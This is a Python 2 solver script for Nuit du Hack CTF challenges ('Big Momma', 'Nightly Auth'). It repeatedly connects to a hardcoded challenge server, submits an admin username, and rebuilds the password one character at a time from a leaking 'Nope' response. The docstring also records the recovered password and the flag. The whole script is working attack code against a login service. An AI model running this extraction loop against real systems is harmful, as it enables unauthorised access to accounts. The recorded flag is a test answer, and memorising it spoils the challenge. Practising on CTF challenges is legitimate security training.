__author__ = 'HuyNA'
import os
import socket
import time
import struct
import sys
import base64
import re

#misc400
"""
    Nightly Auth
Your goal is to authenticate to the service Ip: 54.217.202.218 Port: 1337

Score
400
Link
http://static.nuitduhack.com/annexes/Nightlyauth.tar.gz
"""



# misc200
"""
    Big Momma
Steve programmed a service to authenticate him for administration purposes, take control... Ip: 54.217.202.218 Port: 3000

Score
200
Link
http://static.nuitduhack.com/annexes/bigmomma.tar

THEpasswordISreallyLONGbutYOUllGETtoTHEendOFitEVENTUALLY
Please enter your username:

 Username correct, what is the password?
 Well done! Here is the flag: YoMamaIsLikeHTML,SmallHeadAndHugeBody
"""


host = "54.217.202.218"
local_host="192.168.248.156"
port = 3000

#s.connect((local_host, port))
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf


ok = True
username = "4dM1N15TR4T0R"
password = ""
regex = r"[0-9]+"
while ok:
    time.sleep(0.1)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = recv_until(s, "\n")
    data = recv_until(s, "\n")
    print data
    s.send(username+"\n")
    print recv_until(s, "password?")
    s.send(password+"\n")
    time.sleep(0.01)
    data = recv_until(s, "\n")
    print data
    if data[1:5] == "Nope":
        m = re.search(regex, data)
        b = m.group()
        b = int(b)
        password += chr(b)
        print password
    else:
        ok = False
    s.close()
